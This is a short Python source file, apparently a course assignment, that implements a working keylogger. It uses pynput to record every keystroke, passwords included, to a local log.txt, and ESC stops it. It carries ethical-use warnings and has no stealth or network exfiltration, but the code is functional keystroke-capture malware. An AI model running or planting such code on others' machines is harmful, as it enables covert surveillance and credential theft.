# simple_keylogger.py
# ------------------
# Simple keylogger for educational/demo use only.
# DO NOT use this on anyone else's machine without explicit permission.
# Author: (your name)
# Purpose: record keystrokes to a local file (log.txt) for Task-04 assignment.

from pynput.keyboard import Listener, Key
import time
import traceback

LOG_FILE = "log.txt"

def safe_append(text: str):
    """Append text to log file."""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(text)
    except Exception:
        # If write fails, print minimal info (avoid crash)
        print("Failed writing to log file:", traceback.format_exc())

def handle_backspace():
    """Remove last character from file (best-effort)."""
    try:
        # read current content and remove last codepoint if any
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            data = f.read()
        if data:
            data = data[:-1]
            with open(LOG_FILE, "w", encoding="utf-8") as f:
                f.write(data)
    except FileNotFoundError:
        # file doesn't exist yet — nothing to remove
        pass
    except Exception:
        print("Backspace handling error:", traceback.format_exc())

def on_press(key):
    """
    Called on each key press.
    Translates Key.* into readable characters and writes to file.
    """
    try:
        # Special keys mapping
        if key == Key.space:
            safe_append(" ")
            return
        if key == Key.enter:
            # optionally add timestamp at new line
            safe_append("\n")
            return
        if key == Key.tab:
            safe_append("\t")
            return
        if key in (Key.shift, Key.shift_l, Key.shift_r,
                   Key.ctrl, Key.ctrl_l, Key.ctrl_r,
                   Key.alt, Key.alt_l, Key.alt_r):
            # ignore modifier keys
            return
        if key == Key.backspace:
            handle_backspace()
            return
        if key == Key.esc:
            # stop listener on ESC (graceful exit)
            safe_append("\n[Stopped by ESC at {}]\n".format(time.strftime("%Y-%m-%d %H:%M:%S")))
            return False  # returning False stops the listener

        # For normal alphanumeric and other printable keys:
        # pynput's key might be like 'a' or Key.space. We convert to string and strip quotes.
        k_str = str(key).replace("'", "")

        # If it's something like Key.somekey, convert to a readable bracketed token.
        if k_str.startswith("Key."):
            # e.g. Key.tab already handled; for other keys map to [KeyName]
            token = k_str[4:]  # remove 'Key.'
            safe_append(f"[{token}]")
        else:
            # typical printable character (e.g. a, 1, ',', etc.)
            safe_append(k_str)

    except Exception:
        # catch-all to avoid listener crashing
        print("Error in on_press:", traceback.format_exc())

if __name__ == "__main__":
    # Ethical reminder in runtime output
    print("Running simple_keylogger.py — ethical use only. Press ESC to stop.")
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        # if user sends ctrl+c to terminal
        print("\nStopped by user (KeyboardInterrupt).")
